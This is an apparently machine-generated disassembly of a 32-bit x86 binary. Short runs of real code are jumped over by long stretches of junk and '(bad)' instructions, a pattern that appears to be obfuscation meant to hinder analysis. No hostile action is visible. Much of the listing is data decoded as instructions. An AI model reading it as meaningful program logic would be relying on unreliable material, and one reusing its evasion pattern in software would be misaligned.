  4050f9:	inc    ebp
  4050fa:	push   ds
  4050fb:	fwait
  4050fc:	icebp  
  4050fd:	ret    0xd9e9
  405100:	xchg   edi,eax
  405101:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405102:	std    
  405103:	pop    ebp
  405104:	sbb    eax,DWORD PTR [ebp+ebp*4+0xbcbef50]
  40510b:	push   cs
  40510c:	push   fs
  40510e:	xchg   edx,eax
  40510f:	pushf  
  405110:	ins    DWORD PTR es:[edi],dx
  405111:	or     ebx,eax
  405113:	into   
  405114:	int    0xa3
  405116:	mov    al,0xcb
  405118:	inc    edi
  405119:	jnp    0x40512c
  40511b:	add    cl,bh
  40511d:	mov    al,0xef
  40511f:	out    dx,eax
  405120:	scas   al,BYTE PTR es:[edi]
  405121:	gs dec ecx
  405123:	sub    dh,bh
  405125:	enter  0xc64c,0x9e
  405129:	xor    DWORD PTR [esi-0x60],esp
  40512c:	(bad)
  40512f:	xchg   ebx,eax
  405130:	pop    edi
  405131:	adc    ebx,DWORD PTR [ebp+0x14e02caf]
  405137:	cmp    eax,0x25f43ba9
  40513c:	mov    dl,0x9b
  40513e:	push   ss
  40513f:	sub    ebx,DWORD PTR [edi-0x2a1fe030]
  405145:	xchg   edx,eax
  405147:	mov    ss,WORD PTR [edi+0x162c7105]
  40514d:	adc    BYTE PTR [edi+eiz*2-0x3213065d],cl
  405154:	push   eax
  405155:	mov    DWORD PTR ds:0x412358,0x10
  40515f:	cmp    DWORD PTR ds:0x412358,0x0
  405166:	je     0x4051ac
  40516c:	cmp    DWORD PTR ds:0x412358,0x4
  405173:	jne    0x405184
  405179:	push   0x4150fd
  40517e:	call   DWORD PTR ds:0x40d1c8
  405184:	cmp    DWORD PTR ds:0x412358,0x5
  40518b:	jne    0x40519c
  405191:	mov    eax,ds:0x412358
  405196:	dec    eax
  405197:	mov    ds:0x412358,eax
  40519c:	mov    eax,ds:0x412358
  4051a1:	dec    eax
  4051a2:	mov    ds:0x412358,eax
  4051a7:	jmp    0x40515f
  4051ac:	mov    eax,DWORD PTR [ebp-0x1c]
  4051af:	xor    eax,esi
  4051b1:	add    eax,edi
  4051b3:	jmp    0x40532c
  4051b8:	(bad)  
  4051b9:	sbb    BYTE PTR [ecx+eiz*1],ah
  4051bc:	clc    
  4051bd:	and    ebx,ebp
  4051bf:	fldcw  WORD PTR [esi+0x390f9672]
  4051c5:	(bad)  
  4051c7:	sti    
  4051c8:	dec    edx
  4051c9:	jo     0x405249
  4051cb:	jle    0x4051a7
  4051cd:	jg     0x40524d
  4051cf:	jle    0x405222
  4051d1:	xchg   esp,eax
  4051d2:	push   0xfffffff0
  4051d4:	in     eax,0x76
  4051d6:	aad    0x3a
  4051d8:	jo     0x40517e
  4051da:	ins    DWORD PTR es:[edi],dx
  4051db:	push   ebx
  4051dc:	xchg   ebx,esi
  4051de:	xor    al,0xf8
  4051e0:	ficomp WORD PTR [edi]
  4051e2:	adc    al,0x23
  4051e4:	pop    ss
  4051e5:	sub    ah,BYTE PTR ds:0x5ff93990
  4051eb:	inc    esp
  4051ec:	mov    ebp,0xea6b64c7
  4051f1:	sub    esp,DWORD PTR [edx+ebp*8-0x3d]
  4051f5:	xacquire xchg DWORD PTR fs:[ecx+0x55],ebx
  4051fa:	push   0x7f3f84a5
  4051ff:	mov    edx,0xa28a0d78
  405204:	pop    ss
  405205:	shl    DWORD PTR [ebx+0x2e],1
  405208:	mov    dh,0xde
  40520a:	rcpps  xmm3,XMMWORD PTR [edx+0x5d]
  40520e:	mov    ah,BYTE PTR [esi+0x39]
  405211:	imul   esp,DWORD PTR [edi],0x37
  405214:	lds    ecx,FWORD PTR [eax]
  405216:	mov    esi,0xee9b51ec
  40521b:	sbb    al,0xea
  40521d:	(bad)  [edx+0x74]
  405220:	fcomp  QWORD PTR [ecx]
  405222:	in     eax,0xb7
  405224:	dec    ebp
  405225:	je     0x40526a
  405227:	retf   
  405228:	mov    cl,0xd6
  40522a:	mov    esi,0xa0f13e0e
  40522f:	mov    WORD PTR [esi],es
  405231:	xor    edi,esp
  405233:	cmp    ch,BYTE PTR [eax-0x3944cf4d]
  405239:	xchg   ebx,eax
  40523a:	rcl    BYTE PTR [ecx-0x41370fbd],cl
  405240:	xor    BYTE PTR [esi-0x3afd33b],dh
  405246:	in     al,dx
  405247:	jmp    0x4052b0
  405249:	ficom  WORD PTR [ecx]
  40524b:	dec    edi
  40524c:	or     ch,bh
  40524e:	push   es
  40524f:	arpl   WORD PTR es:[ebx+0x2f62d15f],bx
  405256:	push   ds
  405257:	arpl   WORD PTR fs:[edi],bx
  40525a:	loopne 0x4051e0
  40525c:	jg     0x4052cc
  40525e:	dec    eax
  40525f:	out    dx,al
  405260:	fst    QWORD PTR [esp+edi*2]
  405263:	call   0x1cce:0x33259f20
  40526a:	push   eax
  40526b:	jmp    0x2553bba5
  405270:	xchg   ebp,eax
  405271:	loope  0x4052db
  405273:	pop    ds
  405274:	test   eax,0x6d8ed360
  405279:	leave  
  40527a:	fcom   DWORD PTR [edx-0x427339d8]
  405280:	xchg   esp,eax
  405281:	imul   esi,edx,0xd82c9ef9
  405287:	xor    ecx,edx
  405289:	dec    ebp
  40528a:	or     ebx,eax
  40528c:	leave  
  40528d:	pop    eax
  40528e:	jne    0x405301
  405290:	jl     0x4052a7
  405292:	cmp    DWORD PTR [edx],ebp
  405294:	jnp    0x4052c7
  405296:	pusha  
  405297:	cmp    BYTE PTR [ebx-0x37],bl
  40529a:	sub    DWORD PTR [eax-0x1f5fb956],eax
  4052a0:	adc    dl,BYTE PTR [ebp+0x5cf39a5]
  4052a6:	jmp    0x4942d12c
  4052ab:	add    ah,bl
  4052ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4052ae:	lods   eax,DWORD PTR ds:[esi]
  4052af:	push   0xffffffd8
  4052b1:	sbb    edx,DWORD PTR [eax]
  4052b3:	das    
  4052b4:	mov    ch,0x3f
  4052b6:	jge    0x4052ec
  4052b8:	jmp    0x4052ce
  4052ba:	std    
  4052bb:	aas    
  4052bc:	js     0x4052bf
  4052be:	sub    eax,0xd42f9587
  4052c3:	mov    eax,0x86a3a8cc
  4052c8:	and    esp,DWORD PTR [edi]
  4052ca:	cld    
  4052cb:	dec    ebp
  4052cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4052cd:	std    
  4052ce:	dec    edi
  4052cf:	cld    
  4052d0:	fstp   DWORD PTR [edx+0x4b]
  4052d3:	or     DWORD PTR ds:0x92d054cf,edx
  4052d9:	fimul  WORD PTR [ecx+0x1c9188c0]
  4052df:	push   ss
  4052e0:	xor    al,0x41
  4052e2:	in     al,0xde
  4052e4:	(bad)  
  4052e5:	and    esp,DWORD PTR [edx+edi*1-0x60772045]
  4052ec:	sahf   
  4052ed:	fimul  WORD PTR [ebx+0x1a]
  4052f0:	fidiv  DWORD PTR ds:0x990436a4
  4052f6:	xor    bh,dh
  4052f8:	fisubr DWORD PTR [esi+0x493d5d4f]
  4052fe:	bound  ebx,QWORD PTR [ebx-0x640b806]
  405304:	and    eax,0x2d3f188
  405309:	add    al,0x2f
  40530b:	dec    ecx
  40530c:	stos   BYTE PTR es:[edi],al
  40530d:	inc    eax
  40530e:	pop    es
  40530f:	dec    ebp
  405310:	ss cs lds ebp,FWORD PTR gs:[edx-0x2d832db6]
  405319:	and    DWORD PTR [eax+ecx*4],eax
  40531c:	loopne 0x4052cb
  40531e:	dec    eax
  40531f:	in     eax,0xd5
  405321:	ds std 
  405323:	sub    al,0x6b
  405325:	mov    ecx,0x5318729e
  40532a:	dec    edi
  40532b:	fist   WORD PTR [eax-0x1]
  40532e:	jne    0x405328
  405330:	lea    eax,[ebp-0x78]
  405333:	push   eax
  405334:	push   DWORD PTR [ebp-0xc]
  405337:	push   DWORD PTR [ebp-0x14]
  40533a:	jmp    0x4054b3
  40533f:	loop   0x40534f
  405341:	cli    
  405342:	cs cli 
  405344:	cli    
  405345:	cli    
  405346:	ret    0x10db
  405349:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40534a:	push   esp
  40534b:	xchg   DWORD PTR [edx],esp
  40534d:	mov    DWORD PTR ds:0x7e7e7616,esi
  405353:	fidivr DWORD PTR [edi+0x7e]
  405356:	jle    0x4052f4
  405358:	mov    edi,0x9cc4f3a3
  40535d:	cwde   
  40535e:	js     0x40539e
  405360:	jb     0x40535d
  405362:	xchg   cl,cl
  405364:	mov    esi,0x97593454
  405369:	adc    BYTE PTR [ecx+0x41],ch
  40536c:	jb     0x40531d
  40536e:	sbb    DWORD PTR [edi+0x54bd11b8],edx
  405374:	stos   BYTE PTR es:[edi],al
  405375:	xor    bl,0x10
  405378:	or     eax,0x291e11b3
  40537d:	adc    DWORD PTR [edi],ebx
  40537f:	cmp    bl,0xba
  405382:	lock jmp 0x8ce0:0x83de20e2
  40538a:	adc    eax,0xe80438e7
  40538f:	fistp  WORD PTR [ebp-0x47]
  405392:	mov    al,0x15
  405394:	je     0x40535a
  405396:	les    edi,FWORD PTR [ecx-0x72353448]
  40539c:	enter  0x3255,0xc0
  4053a0:	dec    ecx
  4053a1:	int    0xd3
  4053a3:	jae    0x405343
  4053a5:	in     eax,dx
  4053a6:	mov    al,ds:0xb32c12eb
  4053ab:	cli    
  4053ac:	mov    ebp,0x80651dae
  4053b1:	mov    al,ds:0x9e1e28b4
  4053b6:	sahf   
  4053b7:	push   esp
  4053b8:	cdq    
  4053b9:	dec    edx
  4053ba:	sub    al,0x5b
  4053bc:	xchg   edx,eax
  4053bd:	push   edi
  4053be:	popw   es
  4053c0:	mov    edi,0x78e5486d
  4053c5:	call   0x7170bc75
  4053ca:	iret   
  4053cb:	cmp    BYTE PTR [edi+eiz*8],bh
  4053ce:	sub    ebx,DWORD PTR [ebp-0x242dc753]
  4053d4:	js     0x405391
  4053d6:	xor    eax,0x7bf5fed4
  4053db:	outs   dx,BYTE PTR ds:[esi]
  4053dc:	push   es
  4053dd:	clc    
  4053de:	scas   al,BYTE PTR es:[edi]
  4053df:	mul    esp
  4053e1:	(bad)  
  4053e2:	not    BYTE PTR [edx+0x1ab97d62]
  4053e8:	pop    esp
  4053e9:	(bad)  
  4053eb:	mov    bh,0x9e
  4053ed:	inc    esi
  4053ee:	cmp    DWORD PTR [eax-0xc49f9d3],edx
  4053f4:	xchg   ebp,eax
  4053f5:	inc    edx
  4053f6:	ret    
  4053f7:	fs (bad) 
  4053f9:	xchg   esp,eax
  4053fa:	fst    QWORD PTR [ecx-0x35595808]
  405400:	adc    DWORD PTR [ebp+0x3cc1b48f],ecx
  405406:	ret    0xc2a5
  405409:	sahf   
  40540a:	test   al,0x79
  40540c:	dec    DWORD PTR [edi-0x456fe020]
  405412:	fs std 
  405414:	and    DWORD PTR [edi-0x3],ebx
  405417:	mov    bh,0x3b
  405419:	ja     0x4053ab
  40541b:	call   0xbb30:0xf5a5c1b
  405422:	frstor [esi+edi*1]
  405425:	mov    DWORD PTR [edx+ebx*1],edx
  405428:	push   esi
  405429:	test   al,0x91
  40542b:	dec    ebx
  40542c:	pop    edi
  40542d:	repz test eax,0xc88188e8
  405433:	pop    es
  405434:	imul   ecx,DWORD PTR [edi+esi*2],0xffffffab
  405438:	hlt    
  405439:	mov    ebx,0xb703e9a
  40543e:	mov    ch,0x60
  405440:	lock push edi
  405442:	add    eax,0x4c87d31a
  405447:	or     DWORD PTR [ebx+0x6688b396],esp
  40544d:	xor    BYTE PTR [ebx+edi*8+0x1e],0x27
  405452:	jns    0x40541e
  405454:	call   0xbd1d:0x4d9016ff
  40545b:	cld    
  40545c:	mov    edi,0x56432850
  405461:	call   0x3a4e:0x41180deb
  405468:	ficom  WORD PTR ds:0xed663cf2
  40546e:	imul   edx,DWORD PTR [ebx-0x2c],0xffffff9e
  405472:	lds    ebx,FWORD PTR [ebx+0x41]
  405475:	sub    ecx,edx
  405477:	push   ecx
  405478:	mov    BYTE PTR [ebx],dh
  40547a:	add    al,0xc2
  40547c:	xor    ebx,DWORD PTR [ebp+edx*1+0x58aa190b]
  405483:	mov    ecx,0x33ae89ec
  405488:	jno    0x40543b
  40548a:	shr    DWORD PTR [edi+0x73],cl
  40548d:	mov    eax,0x2289106b
  405492:	mov    eax,DWORD PTR [eax]
  405494:	mov    bl,al
  405496:	sbb    eax,0x1bf9d4b7
  40549b:	mov    bl,0x6f
  40549d:	cdq    
  40549e:	sbb    bh,BYTE PTR [edi-0x39]
  4054a1:	push   ds
  4054a2:	push   ss
  4054a3:	push   cs
  4054a4:	aam    0x10
  4054a6:	lds    ecx,FWORD PTR [edi]
  4054a8:	add    eax,0x2c40beaf
  4054ad:	jecxz  0x405489
  4054af:	loopne 0x405443
  4054b1:	push   0xffffffc6
  4054b3:	call   0x409607
  4054b8:	test   eax,eax
  4054ba:	je     0x4054e5
  4054c0:	lea    eax,[ebp-0x78]
  4054c3:	push   eax
  4054c4:	mov    eax,DWORD PTR [ebp-0x14]
  4054c7:	xor    eax,esi
  4054c9:	add    eax,edi
  4054cb:	push   eax
  4054cc:	mov    eax,DWORD PTR [ebp-0x10]
  4054cf:	add    eax,0xee
  4054d4:	push   eax
  4054d5:	mov    eax,DWORD PTR [ebp-0x10]
  4054d8:	mov    eax,DWORD PTR [eax+0x198]
  4054de:	push   DWORD PTR [eax]
  4054e0:	call   0x40ae4d
  4054e5:	mov    ecx,DWORD PTR [ebp-0x1c]
  4054e8:	xor    ecx,esi
  4054ea:	mov    eax,0xffcd8d61
  4054ef:	sub    eax,ecx
  4054f1:	sub    eax,DWORD PTR [ebp-0x8]
  4054f4:	mov    ecx,DWORD PTR [ebp-0x30]
  4054f7:	add    ecx,eax
  4054f9:	mov    eax,DWORD PTR [ebp-0x8]
  4054fc:	jmp    0x405675
  405501:	lahf   
  405502:	(bad)  
  405503:	icebp  
  405504:	shl    DWORD PTR [ecx-0x50bea01f],1
  40550a:	icebp  
  40550b:	add    DWORD PTR [edi-0xa],0x6f
  40550f:	lods   al,BYTE PTR ds:[esi]
  405510:	popf   
  405511:	bnd ja 0x405592
  405514:	jle    0x4054f0
  405516:	jg     0x405596
  405518:	jle    0x4054e1
  40551a:	(bad)  
  40551b:	cmp    dh,BYTE PTR [ebp+0x73f1023]
  405521:	jecxz  0x4054df
  405523:	imul   edx,DWORD PTR [ebx-0x6cb72c52],0x62
  40552a:	out    0x92,eax
  40552c:	fisttp QWORD PTR ds:0xd0ccc786
  405532:	imul   esp,ebx,0xfffffff7
  405535:	es mov edi,0x372f27fa
  40553b:	sbb    al,0x98
  40553d:	neg    dh
  40553f:	xor    al,0x4b
  405541:	iret   
  405542:	cs push esp
  405544:	adc    eax,0x377fb726
  405549:	iret   
  40554a:	(bad)  
  40554d:	shl    DWORD PTR [esi],0x23
  405550:	pop    ds
  405551:	push   0x1b43dbce
  405556:	or     DWORD PTR [ecx-0x4efc10cd],esi
  40555c:	pop    ds
  40555d:	fstp   QWORD PTR gs:[ebx]
  405560:	scas   eax,DWORD PTR es:[edi]
  405561:	lock pop edx
  405563:	jg     0x40552c
  405565:	pop    ebx
  405566:	adc    al,0xde
  405568:	or     cl,BYTE PTR [edi+0x85377d1]
  40556e:	push   edx
  40556f:	bound  ecx,QWORD PTR [edi-0x54]
  405572:	xlat   BYTE PTR ds:[ebx]
  405573:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405574:	jmp    0x42212413
  405579:	jmp    0x588a0db0
  40557e:	mov    es,WORD PTR [ecx+0x7fe03293]
  405584:	out    dx,al
  405585:	cmp    BYTE PTR [ebx+0x52],cl
  405588:	and    dl,ah
  40558a:	jl     0x40551e
  40558c:	mov    ah,0xd1
  40558e:	div    DWORD PTR [ecx+0x38]
  405591:	mov    bl,0xa8
  405593:	das    
  405594:	test   al,al
  405596:	cmp    al,0x18
  405598:	add    bl,BYTE PTR [ecx+0x59]
  40559b:	sbb    DWORD PTR [ecx-0x54707d67],0x6d6a2b41
  4055a5:	xchg   BYTE PTR [edx-0x7b],bh
  4055a8:	pop    ss
  4055a9:	push   DWORD PTR [ebx-0x3f]
  4055ac:	mov    ebp,0xb330bcb0
  4055b1:	cmp    eax,0x41007c23
  4055b6:	add    BYTE PTR [ebp+edi*1-0x154d41ab],al
  4055bd:	lds    eax,FWORD PTR [esi-0x3]
  4055c0:	stc    
  4055c1:	outs   dx,DWORD PTR ds:[esi]
  4055c2:	imul   ebp,DWORD PTR [eax+0x521bec4d],0x5d12db59
  4055cc:	sbb    al,0x16
  4055ce:	fwait
  4055cf:	jp     0x405615
  4055d1:	retf   0xe581
  4055d4:	xchg   edx,eax
  4055d5:	je     0x405570
  4055d7:	fcomp  DWORD PTR cs:[ebp-0x30]
  4055db:	jns    0x40563a
  4055dd:	and    esp,DWORD PTR [edx-0x5ecd0c34]
  4055e3:	fs lahf 
  4055e5:	pop    edi
  4055e6:	in     al,0xa
  4055e8:	fist   DWORD PTR [ebp+0x531690e6]
  4055ee:	push   cs
  4055ef:	ficom  WORD PTR [ecx-0x1a8827cc]
  4055f5:	mul    DWORD PTR [ebx+eax*8]
  4055f8:	into   
  4055f9:	rcr    BYTE PTR [ebp-0x2a],1
  4055fc:	dec    esp
  4055fd:	pop    edx
  4055fe:	das    
  4055ff:	xchg   BYTE PTR [ebx+esi*2+0x7511bbc7],bh
  405606:	das    
  405607:	cdq    
  405608:	push   ss
  405609:	(bad)  
  40560a:	retf   
  40560b:	and    cl,BYTE PTR [esi-0x29f77525]
  405611:	lock call FWORD PTR [edx+ecx*1+0x9]
  405616:	in     al,0xb9
  405618:	ror    DWORD PTR [eax+ecx*1-0x22],0x86
  40561d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40561e:	stos   BYTE PTR es:[edi],al
  40561f:	mov    eax,0xce6c6cdd
  405624:	in     al,0xbd
  405626:	jbe    0x405673
  405628:	call   0xa012:0xaa01fd8a
  40562f:	out    dx,eax
  405630:	sub    ah,BYTE PTR [eax]
  405632:	lahf   
  405633:	push   0xffffffee
  405635:	jp     0x4055f3
  405637:	lea    edx,[eax]
  405639:	mul    BYTE PTR [ebx]
  40563b:	mov    ch,0x89
  40563d:	dec    esi
  40563e:	mov    dh,0x2a
  405640:	push   eax
  405641:	or     al,0x35
  405643:	add    eax,0x63a5263e
  405648:	in     al,dx
  405649:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40564a:	mov    dl,BYTE PTR [esi+0x22731674]
  405650:	and    BYTE PTR [edx+0x33c597b6],0x12
  405657:	mov    bl,0x32
  405659:	pop    edx
  40565a:	ja     0x4056cf
  40565c:	sub    al,0x25
  40565e:	cmp    cl,BYTE PTR [edi-0x6daa1dbc]
  405664:	repz dec edx
  405666:	popa   
  405667:	jne    0x405649
  405669:	cmp    ebp,DWORD PTR [ebx]
  40566b:	xor    al,0xb7
  40566d:	ja     0x40568f
  40566f:	push   ebx
  405670:	inc    esi
  405671:	adc    ebx,0xffffffab
  405674:	imul   ecx,DWORD PTR [ecx+0x458a0148],0xf84d8bff
  40567e:	xor    al,0x4a
  405680:	sub    al,0x34
  405682:	mov    BYTE PTR [ecx],al
  405684:	lea    eax,[ebp-0x8]
  405687:	inc    BYTE PTR [eax]
  405689:	inc    eax
  40568a:	push   eax
  40568b:	pop    ecx
  40568c:	dec    ecx
  40568d:	xchg   ecx,edx
  40568f:	jmp    0x405808
  405694:	mov    gs,WORD PTR [edi+0x79]
  405697:	in     eax,0x79
  405699:	stc    
  40569a:	and    BYTE PTR [ebp-0x3],0xf5
  40569e:	cmp    esp,eax
  4056a0:	add    BYTE PTR [eax+edi*8],cl
  4056a3:	sbb    DWORD PTR [esi+0x74],0x7fda7e7e
  4056aa:	jle    0x40572a
  4056ac:	mov    esp,0x36459dae
  4056b1:	lods   eax,DWORD PTR ds:[esi]
  4056b2:	das    
  4056b3:	imul   ebp,DWORD PTR [ebp+0x37b1de8b],0xffffffff
  4056ba:	shl    DWORD PTR [ecx],0x29
  4056bd:	daa    
  4056be:	xchg   ebp,eax
  4056bf:	inc    ebx
  4056c0:	popf   
  4056c1:	inc    ebx
  4056c2:	xchg   esi,eax
  4056c3:	fsubr  QWORD PTR [ecx+eax*4+0x4d7c8f36]
  4056ca:	sub    cl,BYTE PTR [esi-0xf]
  4056cd:	dec    ecx
  4056ce:	xor    edi,DWORD PTR [ecx-0x335428dc]
  4056d4:	adc    DWORD PTR [esi+0x2d],ebx
  4056d7:	(bad)  
  4056d8:	bound  esp,QWORD PTR [edx+0x3b]
  4056db:	xchg   edx,eax
  4056dc:	cdq    
  4056dd:	or     BYTE PTR [edi],dh
  4056df:	jle    0x40574b
  4056e1:	jbe    0x405719
  4056e3:	loope  0x40574c
  4056e5:	adc    ebp,DWORD PTR [esi+ecx*4+0x5af74ede]
  4056ec:	inc    ebp
  4056ed:	jb     0x4056d3
  4056ef:	push   ecx
  4056f0:	and    DWORD PTR [ebx],esi
  4056f2:	and    bh,BYTE PTR [edi]
  4056f4:	pop    eax
  4056f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4056f6:	mov    WORD PTR [edx-0x2e],ss
  4056f9:	adc    BYTE PTR ds:0x5e36e04e,ch
  4056ff:	sub    al,0x38
  405701:	loop   0x405734
  405703:	inc    esp
  405704:	add    al,BYTE PTR gs:[ebx+0x6763417e]
  40570b:	inc    ebp
  40570c:	sysret 
  40570e:	jmp    0xe5ca:0x2a3312d5
  405715:	dec    ebp
  405716:	fist   DWORD PTR [ebx+0x77]
  405719:	fstp   DWORD PTR [edi]
  40571b:	mov    DWORD PTR [esi+0x5e],edx
  40571e:	into   
  40571f:	jb     0x405758
  405721:	xor    eax,0xd8fbc854
  405726:	daa    
  405727:	out    dx,eax
  405728:	je     0x405717
  40572a:	pop    esi
  40572b:	mov    DWORD PTR [eax+0x6d],0xf2fb4133
  405732:	mov    esi,0xa5e2c92b
  405737:	pop    ebp
  405738:	pusha  
  405739:	out    dx,eax
  40573a:	fs stos BYTE PTR es:[edi],al
  40573c:	adc    bl,BYTE PTR [ebx-0x69]
  40573f:	rcl    BYTE PTR [eax],1
  405741:	mov    ah,0xd8
  405743:	jne    0x40577c
  405745:	dec    ebp
  405746:	mov    ecx,0x7ac49e0d
  40574b:	sub    esi,DWORD PTR [eax-0x2138dc86]
  405751:	or     BYTE PTR [eax-0x3a],ch
  405754:	mov    dl,0xd6
  405756:	punpckldq mm3,DWORD PTR [esi-0x7c]
  40575a:	add    al,0xfd
  40575c:	mov    esp,0xf77ba0be
  405761:	pop    ebx
  405762:	jo     0x4057aa
  405764:	jnp    0x405792
  405766:	mov    dh,0xf9
  405768:	push   es
  405769:	idiv   BYTE PTR es:[ecx-0x4a5b7b49]
  405770:	stc    
  405771:	pop    edi
  405772:	in     al,dx
  405773:	aaa    
  405774:	push   0x2d
  405776:	mov    edi,0x53c03c42
  40577b:	(bad)  
  40577c:	inc    ebp
  40577d:	sbb    BYTE PTR [ebx],cl
  40577f:	out    dx,al
  405780:	loope  0x40578e
  405782:	push   ss
  405783:	and    ebp,ebx
  405785:	imul   ch
  405787:	out    0x2a,eax
  405789:	imul   ecx,DWORD PTR [ebx+0x1a],0xe8842cb5
  405790:	or     eax,0x99886327
  405795:	and    edi,esi
  405797:	cdq    
  405798:	xchg   ebx,eax
  405799:	call   DWORD PTR [edi+0x2ef96e4e]
  40579f:	ror    WORD PTR [esi-0x13],1
  4057a3:	xchg   ebx,eax
  4057a4:	pop    edi
  4057a5:	std    
  4057a6:	mov    ebx,ecx
  4057a8:	outs   dx,BYTE PTR ds:[esi]
  4057a9:	mov    ebx,0xb0abf77a
  4057ae:	push   ss
  4057af:	or     BYTE PTR [ecx+eiz*1],0xe2
  4057b3:	retf   
  4057b4:	cmp    edi,ebp
  4057b6:	stos   BYTE PTR es:[edi],al
  4057b7:	push   cs
  4057b8:	not    cl
  4057ba:	mov    edi,0xe4ba2d4e
  4057bf:	pop    es
  4057c0:	test   DWORD PTR [ebx],esp
  4057c2:	inc    edi
  4057c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4057c4:	xor    eax,0x6b0c3125
  4057c9:	add    DWORD PTR [ecx+0x4067b2eb],ebx
  4057cf:	pop    ds
  4057d0:	cmp    ch,BYTE PTR [esi]
  4057d2:	mov    eax,ds:0xa41614c8
  4057d7:	sahf   
  4057d8:	mov    al,0x31
  4057da:	mov    ?,WORD PTR [ecx+edx*2]
  4057dd:	arpl   WORD PTR [ebx+edi*8],cx
  4057e0:	and    BYTE PTR [edx],cl
  4057e2:	pop    edi
  4057e3:	sbb    DWORD PTR es:[edi-0x56f3cf10],eax
  4057ea:	icebp  
  4057eb:	mov    esi,cs
  4057ed:	add    eax,0x1570f80a
  4057f2:	aas    
  4057f3:	sub    DWORD PTR [eax-0x33207e59],ebx
  4057f9:	mov    eax,ds:0x8d4d9c41
  4057fe:	test   BYTE PTR cs:[eax],dh
  405801:	or     al,BYTE PTR [edx]
  405803:	das    
  405804:	pop    ebx
  405805:	leave  
  405806:	mov    al,ds:0xff0afe9b
  40580b:	jne    0x4057fd
  40580d:	mov    eax,ds:0x40d68c
  405812:	mov    eax,DWORD PTR [eax]
  405814:	push   DWORD PTR [eax]
  405816:	lea    eax,ds:0x40d6a8
  40581c:	push   DWORD PTR [eax]
  40581e:	lea    eax,ds:0x40d454
  405824:	push   DWORD PTR [eax]
  405826:	lea    eax,ds:0x40d688
  40582c:	push   DWORD PTR [eax]
  40582e:	lea    eax,ds:0x40d784
  405834:	push   DWORD PTR [eax]
  405836:	xchg   ebx,edx
  405838:	inc    ebx
  405839:	inc    ebx
  40583a:	sub    ebx,0x3
  40583d:	push   ebx
  40583e:	pop    eax
  40583f:	call   DWORD PTR [eax+0x1]
  405842:	mov    eax,DWORD PTR [ebp-0x20]
  405845:	jmp    0x4059be
  40584a:	mov    WORD PTR [edx+ebx*8+0x33],es
  40584e:	fidiv  DWORD PTR [ecx+0x8615985]
  405854:	or     al,0x32
  405856:	push   edi
  405857:	or     al,0xc1
  405859:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40585a:	cmp    cl,BYTE PTR [edx]
  40585c:	jle    0x4058dc
  40585e:	fidivr DWORD PTR [edi+0x7e]
  405861:	jle    0x405806
  405863:	popf   
  405864:	popf   
  405865:	arpl   di,di
  405867:	pop    edx
  405868:	or     bl,BYTE PTR [ebp+0x37040c18]
  40586e:	ja     0x405840
  405870:	jl     0x405844
  405872:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405873:	ficom  DWORD PTR [edx+0x29]
  405876:	retf   0xd66a
  405879:	mov    dh,0x44
  40587b:	sub    bl,BYTE PTR [esi]
  40587d:	popf   
  40587e:	mov    fs,WORD PTR [edx+esi*1]
  405881:	fadd   QWORD PTR [edx+0x62]
  405884:	mov    cl,0xec
  405886:	and    dl,BYTE PTR [edi]
  405888:	or     eax,0x1fd460bb
  40588d:	in     al,0x68
  40588f:	xchg   esp,eax
  405890:	fstp   DWORD PTR [ebx]
  405892:	inc    eax
  405893:	loop   0x40582f
  405895:	and    eax,0x68ebe7d3
  40589a:	popf   
  40589b:	mov    ebx,0x95d5fd94
  4058a0:	(bad)  
  4058a1:	out    dx,eax
  4058a2:	(bad)  
  4058a3:	mov    ebp,0xaac2759f
  4058a8:	fidiv  DWORD PTR [esi]
  4058aa:	sbb    DWORD PTR [edi+0x29],edx
  4058ad:	or     edi,edx
  4058af:	sbb    eax,0xece1e460
  4058b4:	or     al,0x64
  4058b6:	dec    ebx
  4058b7:	adc    ebx,esi
  4058b9:	dec    esi
  4058ba:	sub    BYTE PTR [ecx+0x65],0x86
  4058be:	out    dx,eax
  4058bf:	and    ebx,DWORD PTR [edi+0x2b]
  4058c2:	rol    BYTE PTR [ebx],0xca
  4058c5:	repnz mov bp,0xaf33
  4058ca:	push   ebp
  4058cb:	push   eax
  4058cc:	dec    edx
  4058cd:	dec    edi
  4058ce:	sbb    ah,dl
  4058d0:	je     0x4058c1
  4058d2:	rcr    eax,0x6b
  4058d5:	adc    DWORD PTR [eax+0x4],0x63
  4058d9:	in     eax,0xe6
  4058db:	push   esi
  4058dc:	jbe    0x4058f6
  4058de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4058df:	nop
  4058e0:	dec    eax
  4058e1:	mov    ebp,0xfb4f7158
  4058e6:	(bad)  
  4058e7:	enter  0x44dc,0x3b
  4058eb:	lahf   
  4058ec:	add    DWORD PTR [edi-0x1],edi
  4058ef:	adc    DWORD PTR [ebx-0x31039f66],eax
  4058f5:	or     WORD PTR [esi-0x5d3cc847],sp
  4058fc:	imul   ebp,DWORD PTR [ebx+eiz*1+0x9e8a75e],0x61b7a6e4
  405907:	fild   QWORD PTR [edx-0x6b2fecb0]
  40590d:	test   DWORD PTR [eax-0x1980fee1],esi
  405913:	inc    ecx
  405914:	(bad)  
  405915:	rcl    BYTE PTR gs:[ecx-0x5a],0xa
  40591a:	scas   eax,DWORD PTR es:[edi]
  40591b:	lods   eax,DWORD PTR ds:[esi]
  40591c:	loop   0x40595c
  40591e:	(bad)  
  40591f:	popf   
  405920:	and    al,0x24
  405922:	xchg   ecx,eax
  405923:	dec    DWORD PTR [ebp-0x7d2053bc]
  405929:	loop   0x4058ac
  40592b:	icebp  
  40592c:	into   
  40592d:	test   DWORD PTR [ebp-0x4c6d6875],edi
  405933:	push   ss
  405934:	and    eax,0x611f8a83
  405939:	aam    0xf5
  40593b:	jmp    0xde7cc7ca
  405940:	jno    0x405913
  405942:	psllq  mm1,mm3
  405945:	inc    esi
  405946:	data16 mov ds:0xcf7609a1,al
  40594c:	rcl    DWORD PTR [edx+0x4b07612e],0x28
  405953:	out    0xe5,al
